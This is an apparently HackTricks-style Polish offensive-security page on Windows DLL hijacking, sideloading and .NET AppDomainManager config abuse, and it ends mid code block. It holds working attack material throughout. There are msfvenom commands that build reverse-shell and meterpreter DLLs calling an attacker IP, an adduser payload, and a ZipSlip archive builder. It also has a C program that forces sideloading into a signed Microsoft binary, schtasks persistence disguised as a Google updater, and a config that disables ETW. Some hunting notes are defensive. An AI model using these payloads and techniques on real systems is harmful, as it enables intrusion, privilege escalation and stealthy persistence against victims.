# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Podstawowe informacje

DLL Hijacking polega na nakłonieniu zaufanej aplikacji do załadowania złośliwej biblioteki DLL. Termin ten obejmuje kilka taktyk, takich jak **DLL Spoofing, Injection i Side-Loading**. Jest wykorzystywany głównie do wykonywania kodu, uzyskiwania persistence oraz, rzadziej, eskalacji uprawnień. Mimo że poniżej skupiamy się na eskalacji, metoda hijackingu pozostaje taka sama niezależnie od celu.

### Typowe techniki

W przypadku DLL hijackingu stosuje się kilka metod, a skuteczność każdej z nich zależy od sposobu ładowania bibliotek DLL przez aplikację:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Zastąpienie prawidłowej biblioteki DLL złośliwą biblioteką, opcjonalnie z użyciem DLL Proxying w celu zachowania funkcjonalności oryginalnej biblioteki DLL.
2. **DLL Search Order Hijacking**: Umieszczenie złośliwej biblioteki DLL na ścieżce wyszukiwania znajdującej się przed ścieżką do prawidłowej biblioteki, wykorzystując schemat wyszukiwania aplikacji.
3. **Phantom DLL Hijacking**: Utworzenie złośliwej biblioteki DLL, którą aplikacja załaduje, zakładając, że jest to nieistniejąca, wymagana biblioteka DLL.
4. **DLL Redirection**: Modyfikowanie parametrów wyszukiwania, takich jak `%PATH%`, lub plików `.exe.manifest` / `.exe.local`, aby przekierować aplikację do złośliwej biblioteki DLL.
5. **WinSxS DLL Replacement**: Zastąpienie prawidłowej biblioteki DLL złośliwym odpowiednikiem w katalogu WinSxS — metoda często kojarzona z DLL side-loading.
6. **Relative Path DLL Hijacking**: Umieszczenie złośliwej biblioteki DLL w kontrolowanym przez użytkownika katalogu razem ze skopiowaną aplikacją, co przypomina techniki Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading nie jest jedynym sposobem na zmuszenie zaufanego procesu **.NET Framework** do załadowania kodu atakującego. Jeśli docelowy plik wykonywalny jest aplikacją **managed**, CLR sprawdza również plik konfiguracji aplikacji o nazwie odpowiadającej nazwie pliku wykonywalnego (na przykład `Setup.exe.config`). Plik ten może definiować niestandardowy **AppDomainManager**. Jeśli konfiguracja wskazuje na kontrolowany przez atakującego assembly umieszczony obok pliku EXE, CLR załaduje go **przed zwykłą ścieżką wykonywania kodu aplikacji** i uruchomi wewnątrz zaufanego procesu.<sup>[[24]](#references)</sup>

Zgodnie ze schematem konfiguracji .NET Framework firmy Microsoft zarówno `<appDomainManagerAssembly>`, jak i `<appDomainManagerType>` muszą być obecne, aby użyty został niestandardowy manager.<sup>[[16]](#references)[[17]](#references)</sup>

Minimalna konfiguracja:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimalny menedżer:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktyczne uwagi:
- Jest to technika specyficzna dla **.NET Framework**. Zależy od parsowania konfiguracji CLR, a nie od kolejności wyszukiwania DLL w Win32.
- Host musi być rzeczywiście **managed EXE**. Szybka weryfikacja: `sigcheck -m target.exe`, `corflags target.exe` lub sprawdzenie obecności **CLR Runtime Header** w metadanych PE.
- Nazwa pliku konfiguracyjnego musi dokładnie odpowiadać nazwie pliku wykonywalnego (`<binary>.config`) i zwykle znajduje się **obok EXE**.
- Jest to przydatne w przypadku **signed Microsoft/vendor binaries**, ponieważ zaufany EXE pozostaje niezmieniony, podczas gdy złośliwe managed assembly wykonuje się w tym samym procesie.
- Jeśli masz już katalog instalatora/aktualizacji z prawem zapisu, AppDomainManager hijacking może zostać użyty jako **first stage**, a następnie można zastosować klasyczne DLL sideloading lub reflective loading dla kolejnych etapów.

### AppDomainManager jako downloader + bootstrap scheduled task

Praktyczny wzorzec intrusion polega na połączeniu zaufanego managed EXE zarówno ze złośliwym `*.config`, jak i ze złośliwą biblioteką DLL AppDomainManager, która działa wyłącznie jako **small bootstrapper**:<sup>[[25]](#references)</sup>

1. Użytkownik uruchamia signed .NET installer lub updater z wiarygodnej lokalizacji, takiej jak `%USERPROFILE%\Downloads`.
2. Sąsiedni config powoduje, że CLR załaduje assembly atakującego **przed** rozpoczęciem logiki właściwej aplikacji.
3. Złośliwy manager wykonuje **path gate** (na przykład kontynuuje działanie tylko wtedy, gdy host EXE jest uruchomiony z `Downloads`, a drugi stage może zostać uruchomiony wyłącznie z `%LOCALAPPDATA%`).
4. Jeśli sprawdzenie zakończy się powodzeniem, pobiera real payload do ścieżki z prawem zapisu dla użytkownika, takiej jak `%LOCALAPPDATA%\PerfWatson2.exe`, i ustanawia persistence za pomocą scheduled task.

Dlaczego ten wariant ma znaczenie:
- Signed host EXE pozostaje niezmieniony, więc triage opierający się wyłącznie na hashach głównego binary może nie wykryć compromise.
- Proste **path-based anti-analysis** jest częste: przeniesienie triady ZIP/EXE/DLL na Desktop, do Temp lub do ścieżki sandboxa może celowo przerwać chain.
- First-stage AppDomainManager DLL może pozostać mała i generować niewiele szumu, podczas gdy właściwy implant zostanie pobrany później.

Minimalny przykład persistence często spotykany w tym wzorcu:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Uwagi:
- ` /rl highest` oznacza **najwyższy dostępny poziom** dla danego użytkownika/sesji; samo w sobie nie gwarantuje eskalacji do SYSTEM.
- Ta technika jest często lepiej klasyfikowana jako **execution/persistence via .NET config abuse** niż klasyczne przechwytywanie kolejności wyszukiwania brakującego DLL, mimo że operatorzy często łączą oba podejścia.

Punkty kontrolne detekcji:
- Podpisane pliki wykonywalne .NET uruchamiane ze **ścieżek po ekstrakcji ZIP**, `Downloads`, `%TEMP%` lub innych folderów zapisywalnych przez użytkownika, wraz ze **współlokalnym** `<exe>.config`.
- Nowe scheduled tasks, których akcja wskazuje na `%LOCALAPPDATA%`, `%APPDATA%` lub `Downloads`, a których nazwy naśladują updatery przeglądarek lub dostawców.
- Krótkotrwałe managed bootstrap processes, które natychmiast pobierają kolejny EXE, a następnie uruchamiają `schtasks.exe`.
- Samples, które kończą działanie wcześniej, jeśli ścieżka pliku wykonywalnego nie pasuje do oczekiwanego katalogu profilu użytkownika.

### Przejęcie istniejącego scheduled task w celu ponownego uruchomienia łańcucha sideloadingu

W celu persistence nie należy szukać wyłącznie **tworzenia nowego taska**. Niektóre intrusion sets czekają, aż legalny installer utworzy **zwykły task aktualizera**, a następnie **przepisują akcję taska**, tak aby istniejąca nazwa, autor i trigger nadal wyglądały znajomo dla defenderów.

Możliwy do ponownego wykorzystania workflow:
1. Zainstaluj/uruchom legalne oprogramowanie i zidentyfikuj task, który normalnie tworzy.
2. Wyeksportuj XML taska i zanotuj bieżące wartości `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Zastąp wyłącznie akcję, tak aby task uruchamiał Twój **trusted host EXE** z katalogu stagingowego zapisywalnego przez użytkownika, który następnie wykona sideload lub załaduje właściwy payload przez AppDomain.
4. Zarejestruj task ponownie pod tą samą nazwą zamiast tworzyć nowy, oczywisty artefakt persistence.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Dlaczego jest to bardziej stealth:
- Nazwa zadania nadal może wyglądać wiarygodnie (na przykład jako updater dostawcy).
- Uruchamia je **Task Scheduler service**, więc walidacja procesu nadrzędnego/przodków często wykrywa oczekiwany łańcuch harmonogramu zamiast `explorer.exe`.
- Zespoły DFIR, które szukają wyłącznie **nowych nazw zadań**, mogą przeoczyć zadanie, którego rejestracja już istniała, ale którego akcja wskazuje teraz na `%LOCALAPPDATA%`, `%APPDATA%` lub inną ścieżkę kontrolowaną przez atakującego.

Szybkie punkty do huntingu:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Porównaj XML z `C:\Windows\System32\Tasks\*` oraz metadane z `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` z baseline'em.
- Generuj alert, gdy **zadanie updatera wyglądające na zadanie dostawcy** uruchamia plik z **katalogów zapisywalnych przez użytkownika** lub uruchamia plik .NET EXE z umieszczonym obok plikiem `*.config`.

> [!TIP]
> Aby zobaczyć łańcuch krok po kroku, który łączy HTML staging, konfiguracje AES-CTR i implanty .NET z DLL sideloadingiem, zapoznaj się z poniższym workflow.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Znajdowanie brakujących DLL

Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) z pakietu sysinternals i **ustawienie** **2 następujących filtrów**:

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 następujących filtrów](<../../../images/image (961).png>)

![Common Techniques - Znajdowanie brakujących DLL: Najczęstszym sposobem znajdowania brakujących DLL w systemie jest uruchomienie procmon z pakietu sysinternals i ustawienie 2 następujących filtrów](<../../../images/image (230).png>)

i wyświetlenie tylko **File System Activity**:

![Common Techniques - Znajdowanie brakujących DLL: i wyświetlenie tylko File System Activity](<../../../images/image (153).png>)

Jeśli szukasz **ogólnie brakujących DLL**, **pozostaw** to uruchomione przez kilka **sekund**.\
Jeśli szukasz **brakującej DLL w konkretnym pliku wykonywalnym**, ustaw dodatkowy filtr, taki jak **"Process Name" "contains" `<exec name>`**, uruchom go i zatrzymaj przechwytywanie zdarzeń.<sup>[[9]](#references)</sup>

## Wykorzystanie brakujących DLL

Aby eskalować uprawnienia, poszukaj **DLL, którą uprzywilejowany proces próbuje załadować** z lokalizacji, do której możesz zapisywać. Może się tak zdarzyć, gdy kontrolujesz katalog przeszukiwany przed katalogiem zawierającym legalną DLL albo gdy żądana DLL nie istnieje i możesz zapisywać w jednym z przeszukiwanych katalogów.

### Kolejność wyszukiwania DLL

W **dokumentacji Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **możesz znaleźć informacje o tym, jak dokładnie ładowane są DLL.**

**Aplikacje Windows** szukają DLL, korzystając z zestawu **predefiniowanych ścieżek wyszukiwania** i stosując określoną kolejność. Problem DLL hijacking pojawia się, gdy złośliwa DLL zostanie umieszczona strategicznie w jednym z tych katalogów, dzięki czemu zostanie załadowana przed prawdziwą DLL. Rozwiązaniem zapobiegającym temu problemowi jest zapewnienie, że aplikacja używa ścieżek bezwzględnych podczas odwoływania się do wymaganych DLL.

Poniżej przedstawiono **kolejność wyszukiwania DLL w systemach 32-bitowych**:

1. Katalog, z którego aplikacja została załadowana.
2. Katalog systemowy. Użyj funkcji [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), aby uzyskać ścieżkę tego katalogu.(_C:\Windows\System32_)
3. Katalog systemowy 16-bitowy. Nie istnieje funkcja uzyskująca ścieżkę tego katalogu, ale jest on przeszukiwany. (_C:\Windows\System_)
4. Katalog Windows. Użyj funkcji [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), aby uzyskać ścieżkę tego katalogu.
1. (_C:\Windows_)
5. Bieżący katalog.
6. Katalogi wymienione w zmiennej środowiskowej PATH. Należy pamiętać, że nie obejmuje to ścieżki dla konkretnej aplikacji określonej przez klucz rejestru **App Paths**. Klucz **App Paths** nie jest używany podczas obliczania ścieżki wyszukiwania DLL.

Jest to **domyślna** kolejność wyszukiwania przy włączonym **SafeDllSearchMode**. Gdy jest on wyłączony, bieżący katalog awansuje na drugie miejsce. Aby wyłączyć tę funkcję, utwórz wartość rejestru **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** i ustaw ją na 0 (domyślnie funkcja jest włączona).

Jeśli funkcja [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) zostanie wywołana z **LOAD_WITH_ALTERED_SEARCH_PATH**, wyszukiwanie rozpoczyna się w katalogu modułu wykonywalnego, który ładuje **LoadLibraryEx**.

DLL może zostać załadowana również ze ścieżki bezwzględnej, a nie na podstawie nazwy. W takim przypadku Windows sprawdza podaną ścieżkę wyłącznie w poszukiwaniu samej DLL; zależności żądane na podstawie nazwy nadal podlegają odpowiedniej kolejności wyszukiwania.

Istnieją inne sposoby modyfikowania kolejności wyszukiwania, ale nie będę ich tutaj wyjaśniać.

### Łączenie arbitralnego zapisu pliku z hijackingiem brakującej DLL

1. Użyj filtrów **ProcMon** (`Process Name` = docelowy EXE, `Path` kończy się na `.dll`, `Result` = `NAME NOT FOUND`), aby zebrać nazwy DLL, których proces szuka, ale nie może znaleźć.<sup>[[14]](#references)</sup>
2. Jeśli plik binarny jest uruchamiany według **harmonogramu/usługi**, umieszczenie DLL o jednej z tych nazw w **katalogu aplikacji** (pozycja nr 1 w kolejności wyszukiwania) spowoduje jej załadowanie przy następnym uruchomieniu. W jednym przypadku ze skanerem .NET proces szukał `hostfxr.dll` w `C:\samples\app\` przed załadowaniem prawdziwej kopii z `C:\Program Files\dotnet\fxr\...`.
3. Zbuduj payload DLL (np. reverse shell) z dowolnym exportem: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Jeśli Twoim primitive jest **arbitrary write w stylu ZipSlip**, utwórz plik ZIP, którego wpis wychodzi poza katalog wypakowywania, dzięki czemu DLL trafi do katalogu aplikacji:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Dostarcz archiwum do monitorowanej skrzynki udziału; gdy zaplanowane zadanie ponownie uruchomi proces, załaduje on złośliwą bibliotekę DLL i wykona Twój kod jako konto usługi.

### Wymuszanie sideloading za pośrednictwem RTL_USER_PROCESS_PARAMETERS.DllPath

Zaawansowanym sposobem deterministycznego wpływania na ścieżkę wyszukiwania DLL nowo utworzonego procesu jest ustawienie pola DllPath w RTL_USER_PROCESS_PARAMETERS podczas tworzenia procesu za pomocą natywnych API ntdll. Podając tutaj kontrolowany przez atakującego katalog, można zmusić proces docelowy, który rozwiązuje importowaną bibliotekę DLL po nazwie (bez ścieżki bezwzględnej i bez używania bezpiecznych flag ładowania), do załadowania złośliwej biblioteki DLL z tego katalogu.

Kluczowa idea
- Zbuduj parametry procesu za pomocą RtlCreateProcessParametersEx i podaj niestandardowy DllPath wskazujący na kontrolowany przez Ciebie folder (np. katalog, w którym znajduje się Twój dropper/unpacker).
- Utwórz proces za pomocą RtlCreateUserProcess. Gdy docelowy plik binarny będzie rozwiązywał bibliotekę DLL po nazwie, loader uwzględni podaną wartość DllPath podczas rozwiązywania, umożliwiając niezawodny sideloading, nawet gdy złośliwa biblioteka DLL nie znajduje się w tym samym katalogu co docelowy plik EXE.

Uwagi/ograniczenia
- Dotyczy to tworzonego procesu potomnego; różni się od SetDllDirectory, które wpływa wyłącznie na bieżący proces.
- Proces docelowy musi importować bibliotekę DLL lub wywoływać LoadLibrary dla biblioteki DLL po nazwie (bez ścieżki bezwzględnej i bez używania LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs i zakodowane na stałe ścieżki bezwzględne nie mogą zostać przejęte. Eksporty przekierowane i SxS mogą zmienić kolejność priorytetów.

Minimalny przykład w C (ntdll, szerokie stringi, uproszczona obsługa błędów):

<details>
<summary>Pełny przykład w C: wymuszanie sideloading biblioteki DLL za pośrednictwem RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Przykład użycia operacyjnego
- Umieść złośliwy plik xmllite.dll (eksportujący wymagane funkcje lub proxy do prawdziwego pliku) w swoim katalogu DllPath.
- Uruchom podpisany plik binarny, o którym wiadomo, że wyszukuje xmllite.dll po nazwie, korzystając z powyższej techniki. Loader rozwiąże import za pośrednictwem podanego DllPath i wykona sideloading Twojego pliku DLL.

Zaobserwowano, że technika ta jest wykorzystywana w rzeczywistych kampaniach do tworzenia wieloetapowych łańcuchów sideloadingu: początkowy launcher zapisuje pomocniczy plik DLL, który następnie uruchamia podpisany przez Microsoft, podatny na hijacking plik binarny z niestandardowym DllPath, aby wymusić załadowanie pliku DLL atakującego z katalogu stagingowego.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

W przypadku celów opartych na **.NET Framework** sideloading można wykonać **przed `Main()`**, bez patchowania pamięci, wykorzystując sąsiedni plik **`.exe.config`** aplikacji. Zamiast polegać wyłącznie na kolejności wyszukiwania bibliotek DLL Win32, atakujący umieszcza legalny plik .NET EXE obok złośliwego pliku konfiguracyjnego oraz co najmniej jednego kontrolowanego przez siebie assembly.

Jak działa ten łańcuch:<sup>[[15]](#references)[[22]](#references)</sup>
1. Host EXE uruchamia się, a **CLR odczytuje `<exe>.config`**.
2. Konfiguracja ustawia **`<appDomainManagerAssembly>`** oraz **`<appDomainManagerType>`**, dzięki czemu runtime tworzy kontrolowany przez atakującego obiekt `AppDomainManager`.
3. Złośliwy manager uzyskuje **wykonanie przed `Main()`** wewnątrz zaufanego procesu hosta.
4. Ta sama konfiguracja może wymusić, aby CLR najpierw rozwiązywał lokalne assembly (na przykład `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`), a także osłabić walidację i telemetry runtime bez patchowania inline.

Schemat w stylu kampanii (dokładne zagnieżdżenie może się różnić w zależności od dyrektywy / wersji CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Dlaczego jest to użyteczne:
- **`<probing privatePath="."/>`** utrzymuje rozwiązywanie assembly w katalogu aplikacji, zmieniając ten folder w przewidywalną powierzchnię sideloadingu.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** przenoszą wykonanie do kodu atakującego podczas inicjalizacji CLR, zanim uruchomi się właściwa logika aplikacji.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** może pozwolić aplikacji full-trust ładować niepodpisane lub zmodyfikowane assembly bez błędu walidacji strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** zapobiega przekierowaniom publisher-policy do nowszych assembly.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** sprawia, że wybór runtime jest bardziej deterministyczny.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** jest szczególnie interesujące, ponieważ **CLR wyłącza własną widoczność ETW** z konfiguracji, zamiast aby implant patchował `EtwEventWrite` w pamięci.

Wzorzec operacyjny obserwowany w najnowszych kampaniach:
- Etap 1 umieszcza `setup.exe`, `setup.exe.config` i lokalne assembly.
- Etap 2 kopiuje je do wiarygodnego folderu **AppData update**, zmienia nazwę hosta na coś w rodzaju `update.exe`, a następnie uruchamia go ponownie za pomocą **scheduled task**.
- Etap 3 weryfikuje kontekst wykonania, na przykład oczekiwany proces nadrzędny `svchost.exe` z Task Scheduler, przed załadowaniem finalnego RAT DLL/export.

Pomysły na hunting:
- Podpisane lub w inny sposób legalne **pliki wykonywalne .NET**, uruchamiane z podejrzanymi sąsiadującymi plikami **`.config`** w lokalizacjach z możliwością zapisu przez użytkownika.
- Pliki `.config` zawierające **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** lub **`etwEnable enabled="false"`**.
- Scheduled tasks, które ponownie uruchamiają zmienione pliki update z **`%LOCALAPPDATA%`** lub przeznaczonych dla aplikacji katalogów `\bin\update\`.
- Łańcuchy procesów nadrzędnych i podrzędnych, w których scheduled task uruchamia zaufany host .NET, który natychmiast ładuje assembly spoza dostawcy z własnego katalogu.

#### Wyjątki od kolejności wyszukiwania dll według dokumentacji Windows

Dokumentacja Windows opisuje określone wyjątki od standardowej kolejności wyszukiwania DLL:

- Gdy napotkany zostanie **DLL o tej samej nazwie co DLL już załadowany w pamięci**, system pomija standardowe wyszukiwanie. Zamiast tego sprawdza przekierowanie i manifest, a następnie domyślnie używa DLL już znajdującego się w pamięci. **W tym scenariuszu system nie wyszukuje DLL**.
- Jeśli DLL jest rozpoznany jako **known DLL** dla bieżącej wersji Windows, system użyje swojej wersji known DLL wraz ze wszystkimi zależnymi DLL, **pomijając proces wyszukiwania**. Klucz rejestru **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** zawiera listę tych known DLL.
- Jeśli **DLL ma zależności**, wyszukiwanie zależnych DLL odbywa się tak, jakby wskazano je wyłącznie za pomocą ich **nazw modułów**, niezależnie od tego, czy początkowy DLL został znaleziony przy użyciu pełnej ścieżki.

### Eskalacja uprawnień

**Wymagania**:

- Zidentyfikuj proces, który działa lub będzie działać z **innymi uprawnieniami** (poziome lub lateral movement), a któremu **brakuje DLL**.
- Upewnij się, że dostęp do zapisu jest możliwy w dowolnym **katalogu**, w którym **DLL** będzie **wyszukiwany**. Może to być katalog pliku wykonywalnego lub katalog znajdujący się w systemowej ścieżce.

Te warunki wstępne domyślnie występują rzadko: uprzywilejowane pliki wykonywalne zwykle nie mają brakujących zależności DLL, a standardowi użytkownicy zazwyczaj nie mogą zapisywać w katalogach systemowych ścieżek wyszukiwania. Błędna konfiguracja może jednak ujawnić oba te warunki.\
Jeśli wymagania są spełnione, sprawdź projekt [UACME](https://github.com/hfiref0x/UACME). Chociaż jego głównym celem jest UAC bypass, zawiera PoC DLL-hijackingu dla określonych wersji Windows, które często można dostosować do znalezionego katalogu z możliwością zapisu.

Pamiętaj, że możesz **sprawdzić swoje uprawnienia w folderze**, wykonując:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
I **sprawdź uprawnienia wszystkich folderów w PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Możesz również sprawdzić importy pliku wykonywalnego i eksporty biblioteki DLL za pomocą:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Aby uzyskać pełny przewodnik dotyczący **abuse Dll Hijacking w celu eskalacji uprawnień** przy uprawnieniach do zapisu w folderze **System Path**, sprawdź:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zautomatyzowane narzędzia

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sprawdzi, czy masz uprawnienia do zapisu w dowolnym folderze znajdującym się wewnątrz systemowego PATH.\
Innymi interesującymi zautomatyzowanymi narzędziami do wykrywania tej podatności są **funkcje PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ oraz _Write-HijackDll._

### Przykład

Jeśli znajdziesz możliwy do wykorzystania scenariusz, jedną z najważniejszych rzeczy umożliwiających jego skuteczne wykorzystanie będzie **utworzenie dll eksportującego co najmniej wszystkie funkcje, które plik wykonywalny będzie z niego importował**. Należy jednak pamiętać, że Dll Hijacking jest przydatny do [**eskalacji z poziomu Medium Integrity do High **(z pominięciem UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) lub z poziomu[ **High Integrity do SYSTEM**](../index.html#from-high-integrity-to-system)**.** Przykład **tworzenia poprawnego dll** znajdziesz w tym opracowaniu dotyczącym dll hijacking, skupionym na dll hijacking w celu wykonania: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Ponadto w **następnej sekcj**i znajdziesz kilka **podstawowych kodów dll**, które mogą być przydatne jako **szablony** lub do utworzenia **dll z eksportowanymi funkcjami, które nie są wymagane**.

## **Tworzenie i kompilowanie Dlls**

### **Dll Proxifying**

Zasadniczo **Dll proxy** to Dll zdolny do **wykonania złośliwego kodu po załadowaniu**, a jednocześnie do **udostępniania** i **działania** zgodnie z **oczekiwaniami** poprzez **przekazywanie wszystkich wywołań do prawdziwej biblioteki**.

Za pomocą narzędzia [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) lub [**Spartacus**](https://github.com/Accenture/Spartacus) możesz wskazać plik wykonywalny i wybrać bibliotekę, którą chcesz poddać proxify, a następnie **wygenerować proxified dll**, albo **wskazać Dll** i **wygenerować proxified dll**.

### **Meterpreter**

**Uzyskaj rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Uzyskaj meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Utwórz użytkownika (x86, nie znalazłem wersji x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Własne

W wielu przypadkach skompilowany przez Ciebie DLL musi **eksportować każdą funkcję importowaną przez proces ofiary**. Jeśli brakuje wymaganego eksportu, plik binarny nie może go rozwiązać i exploit kończy się niepowodzeniem.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
